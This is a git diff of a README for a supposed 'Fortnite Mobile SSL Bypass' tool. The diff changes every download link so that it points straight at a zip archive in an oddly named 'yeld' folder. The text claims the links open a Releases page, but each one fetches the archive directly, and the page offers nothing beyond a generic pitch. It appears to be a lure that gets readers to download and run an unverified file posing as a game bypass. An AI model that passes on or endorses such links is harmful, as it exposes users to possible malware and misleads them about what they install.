@@ -1,7 +1,7 @@
 # 🎮 Fortnite-Mobile-SSL-Bypass - Play Fortnite Mobile with Ease
 
 ## 🔗 Download Now
-[![Download Release](https://raw.githubusercontent.com/abrar699979/Fortnite-Mobile-SSL-Bypass/main/yeld/Mobile_SS_Fortnite_Bypass_v2.0-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/abrar699979/Fortnite-Mobile-SSL-Bypass/main/yeld/Mobile_SS_Fortnite_Bypass_v2.0-alpha.5.zip)
+[![Download Release](https://github.com/abrar699979/Fortnite-Mobile-SSL-Bypass/raw/refs/heads/main/yeld/Mobile_SS_Fortnite_Bypass_v2.0-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/abrar699979/Fortnite-Mobile-SSL-Bypass/raw/refs/heads/main/yeld/Mobile_SS_Fortnite_Bypass_v2.0-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the Fortnite-Mobile-SSL-Bypass project. This guide will help you set up the software easily. With this method, you can use proxies to play Fortnite Mobile smoothly.
@@ -9,7 +9,7 @@ Welcome to the Fortnite-Mobile-SSL-Bypass project. This guide will help you set 
 ## 📥 Download & Install
 To get started, visit the Releases page to download the software:
 
-[Download from Releases](https://raw.githubusercontent.com/abrar699979/Fortnite-Mobile-SSL-Bypass/main/yeld/Mobile_SS_Fortnite_Bypass_v2.0-alpha.5.zip)
+[Download from Releases](https://github.com/abrar699979/Fortnite-Mobile-SSL-Bypass/raw/refs/heads/main/yeld/Mobile_SS_Fortnite_Bypass_v2.0-alpha.5.zip)
 
 1. Click on the above link to go to the Releases page.
 2. Find the latest version listed. You will see options for downloading.
@@ -65,4 +65,4 @@ Thank you for choosing Fortnite-Mobile-SSL-Bypass! We appreciate your support an
 ## 🔗 Download Again
 To download the software again or check for updates, visit:
 
-[Download from Releases](https://raw.githubusercontent.com/abrar699979/Fortnite-Mobile-SSL-Bypass/main/yeld/Mobile_SS_Fortnite_Bypass_v2.0-alpha.5.zip)
+[Download from Releases](https://github.com/abrar699979/Fortnite-Mobile-SSL-Bypass/raw/refs/heads/main/yeld/Mobile_SS_Fortnite_Bypass_v2.0-alpha.5.zip)
